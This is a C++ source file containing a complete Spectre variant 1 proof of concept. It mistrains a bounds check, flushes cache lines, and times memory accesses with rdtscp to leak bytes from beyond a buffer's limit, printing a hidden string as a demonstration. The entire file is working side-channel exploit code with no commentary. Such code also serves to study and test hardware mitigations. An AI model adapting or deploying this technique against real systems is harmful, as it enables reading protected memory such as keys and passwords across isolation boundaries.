#include <iostream>
#include <memory>
#include <cstring>
#include <immintrin.h>
#include <chrono>
#include <x86intrin.h>
#include <array>


#define PAGE_SIZE 4096

long get_time() {
#if 1
    unsigned int i;
    return __rdtscp(&i);
#else 
    return std::chrono::duration_cast<std::chrono::nanoseconds>(std::chrono::high_resolution_clock::now().time_since_epoch()).count();
#endif // 0 
}

void access_memory(const void* p) { __asm__ __volatile__ ( "" : : "r"(*static_cast<const uint8_t*>(p)) : "memory" ); }



void score_latencies(const std::array<long, 256>& latencies, std::array<int, 256>& scores, size_t ok_index) {
    double avg = 0;
    for(int q = 0;q < 256;q++) {
        avg += latencies[q] / 255;
    }
    avg -= latencies[ok_index] / 255;

    for(int q = 0;q < 256;q++) {
        if(q != ok_index && latencies[q] < avg / 2) {
            scores[q]++;
        }
    }
}

struct timing_array_type {
    char s[1024];
};

template <typename T> double average(const T& a, size_t skip_index) {
    double res = 0;
    for (size_t i = 0; i < a.size(); ++i) {
        if (i != skip_index) res += a[i];
    }
    return res/a.size();
}

void put_score(const std::array<long, 256> &latencies,std::array<int, 256> &scores,const std::size_t& ok_index) {
    //
    // for(int q = 0;q < 256;q++) {
    //     std::cout << timing[q] << " "; 
    // }
    // std::cout << std::endl;
    double avg = average(latencies, ok_index);
    //std::cout << avg /2 << std::endl;

    constexpr const double latency_threshold = 0.5;
    int count = 0;
    for (size_t i = 0; i < latencies.size(); ++i) {          // Bump up score for low latencies
        if (i != ok_index && latencies[i] < avg*latency_threshold) {
            ++scores[i];
            count++;
        }
    }
    if(count <= 2) {
        for (size_t i = 0; i < latencies.size(); ++i) {          // Bump up score for low latencies
        if (i != ok_index && latencies[i] < avg*latency_threshold) {
            //std::cout << i << " ";
        }
    }
    }
    //std::cout << count<< std::endl;
}

std::pair<size_t, size_t> best_scores(const std::array<int, 256> &scores) {
    std::size_t i1 = 0,i2 = 1;
    if(scores[i1] < scores[i2]) std::swap(i1,i2);
    for(int q = 2;q < 256;q++) {
        if(scores[q] > scores[i2]) {
            i2 = q;
            if(scores[i1] < scores[i2]) {
                std::swap(i1,i2);
            } 
        }
    }    
    return {i1,i2};
}

char attack(const char* data,std::size_t size,std::size_t evil_index) {
    timing_array_type timing_array[256];
    memset(timing_array, 1, sizeof(timing_array_type) * 256);
    std::array<long, 256> timing = {};
    std::array<int, 256> scores = {};
    std::size_t* data_size = new std::size_t();
    *data_size = size;
    
    for(int i = 0;i < 1000;i++) {
        const std::size_t ok_index = i % size;
        for(int j = 0;j < 256;j++) {
            _mm_clflush(timing_array + j);
        }

        for(int j = 0;j < 500;j++) {
            _mm_clflush(&*data_size);
            for(volatile int _ = 0;_ < 500;_++) {}
            std::size_t i_index = (j & 0xf) ? ok_index : evil_index;
            if(i_index < *data_size) {
                access_memory(timing_array + data[i_index]);
            }
        }

        for(int j = 0;j < 256;j++) {
            std::size_t irand = (j * 167 + 13) & 0xff;
            const timing_array_type* const p = timing_array + irand;
            auto begin = get_time();
            access_memory(p);
            timing[irand] = get_time() - begin;
        }

        for(volatile int _ = 0;_ < 500;_++) {}

        put_score(timing,scores,ok_index);
        std::pair<std::size_t,std::size_t> res = best_scores(scores);
        if(scores[res.first] >= scores[res.second] * 2 + 100) {
            return res.first;
        }
    }
    
    std::cout << "An erroe occured";
    return 0;
}

char* allocate_aligned(size_t alignment, size_t size) {
    void* p;
    if (posix_memalign(&p, alignment, size)) return nullptr;
    return static_cast<char*>(p);
}

int main() {
    char* data = allocate_aligned(PAGE_SIZE, PAGE_SIZE * 2);
    std::strcpy(data + PAGE_SIZE,"This shouldn't be seen");
    std::strcpy(data,"ABROUHOIHWELKMDisdfpojwpijgweg");
    for(int i = 0;i < PAGE_SIZE;i++) {
        char c = attack(data,strlen(data),PAGE_SIZE + i);
        if(!c) break;
        std::cout << c;
    }
    std::cout << std::endl;
}